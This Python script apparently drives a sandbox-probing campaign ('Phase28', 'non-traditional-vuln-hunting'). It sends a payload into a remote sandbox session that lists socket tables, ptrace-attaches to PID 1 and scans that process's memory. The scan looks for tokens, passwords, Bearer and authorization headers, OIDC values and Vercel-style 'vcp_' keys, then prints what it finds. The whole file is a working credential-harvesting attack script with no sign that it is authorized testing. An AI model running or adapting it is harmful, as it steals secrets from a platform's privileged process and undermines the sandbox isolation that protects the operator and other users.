# -*- coding: utf-8 -*-
"""Phase28: attach 后内存扫描 init + socket 对端识别 (/proc/net/vsock/unix/tcp)"""
import sys, time
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM

SID = "sbx_kll9MpQ1kHjNgK9pu43InXjkG4th"  # fwtest12

GUEST = r'''
import os, re, ctypes, struct

libc = ctypes.CDLL(None, use_errno=True)

# 1) 先看网络 socket 归属
for f in ['/proc/net/vsock', '/proc/net/unix', '/proc/net/tcp', '/proc/net/tcp6', '/proc/net/udp']:
    try:
        print('[%s]\n%s' % (f, open(f).read()[:2500]), flush=True)
    except Exception as e:
        print('[%s] ERR %s' % (f, e), flush=True)

# 2) attach + waitpid
rc = libc.ptrace(16, 1, None, None)  # PTRACE_ATTACH
print('[attach] rc=%d errno=%d' % (rc, ctypes.get_errno()), flush=True)
time.sleep(1)

# 3) 通过 /proc/1/mem 读内存 (attach 后)
KEYS = [b'vcp_', b'token', b'secret', b'password', b'GIT_', b'vsock', b'http://',
        b'https://', b'api.vercel.com', b'oidc', b'Bearer', b'authorization',
        b'sandbox', b'network', b'proxy', b'v2/', b'/v1', b'cmd', b'ssh']
try:
    mem = open('/proc/1/mem', 'rb')
    found = {}
    total = 0
    for line in open('/proc/1/maps'):
        parts = line.split()
        if len(parts) < 2 or 'r' not in parts[1]:
            continue
        if 'x' in parts[1] or '[' in line:
            continue
        lo, hi = parts[0].split('-')
        addr, end = int(lo, 16), int(hi, 16)
        if end - addr > 0x4000000:  # skip >64MB
            continue
        pos = addr
        while pos < end:
            chunk_size = min(0x200000, end - pos)
            try:
                mem.seek(pos)
                chunk = mem.read(chunk_size)
            except Exception:
                break
            if not chunk:
                break
            total += len(chunk)
            for k in KEYS:
                for m in re.finditer(re.escape(k), chunk):
                    s = max(0, m.start() - 80)
                    e = min(len(chunk), m.end() + 200)
                    found.setdefault(k.decode('latin1'), []).append(
                        '0x%x:%s' % (pos + m.start(), chunk[s:e].replace(b'\x00', b' ').decode('latin1', 'replace')))
            pos += chunk_size
    print('[scan] total=%d bytes' % total, flush=True)
    for k, v in found.items():
        print('== %s (%d) ==' % (k, len(v)), flush=True)
        for item in v[:10]:
            print('   %s' % item[:350], flush=True)
    mem.close()
except Exception as e:
    print('[mem-scan] ERR %s' % e, flush=True)

# 4) detach
libc.ptrace(17, 1, None, None)
print('done', flush=True)
'''
code = "cat > /tmp/pg36.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg36.py"

if __name__ == "__main__":
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=180000)
    print('cmd:', c, flush=True)
    print(r[:15000], flush=True)
